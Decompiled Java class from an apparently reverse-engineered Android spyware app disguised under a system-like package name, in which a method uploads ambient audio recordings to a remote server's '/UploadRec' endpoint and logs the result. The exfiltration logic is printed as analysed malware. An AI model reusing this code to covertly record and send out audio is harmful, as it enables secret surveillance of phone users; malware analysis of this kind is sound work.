package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.h;
import java.io.File;
import java.io.IOException;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class c
  extends a
{
  public c(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, String paramString, File paramFile)
  {
    try
    {
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("INVIO REG.AMB. ");
      localStringBuilder.append(paramString);
      h.a(paramContext, localStringBuilder.toString());
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/UploadRec");
      paramContext.append("/");
      paramContext.append(paramString);
      paramContext = com.app.system.common.d.a.a.a.b(paramContext.toString(), paramFile);
      if ((paramContext != null) && (!paramContext.equals("")))
      {
        paramString = paramContext.body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("sendRecToServer result: ");
        paramContext.append(paramString);
        com.security.d.a.d("ProtocolForAmbientRecs", paramContext.toString(), new Object[0]);
        boolean bool = paramString.equals("0");
        if (bool) {
          return 0;
        }
      }
      else
      {
        return -1;
      }
    }
    catch (IOException paramContext)
    {
      com.security.d.a.a("ProtocolForAmbientRecs", "sendRecToServer: ", new Object[] { paramContext });
    }
    return -1;
  }
}


/* Location:              ~/com/app/system/common/d/a/c.class
 *
 * Reversed by:           J
 */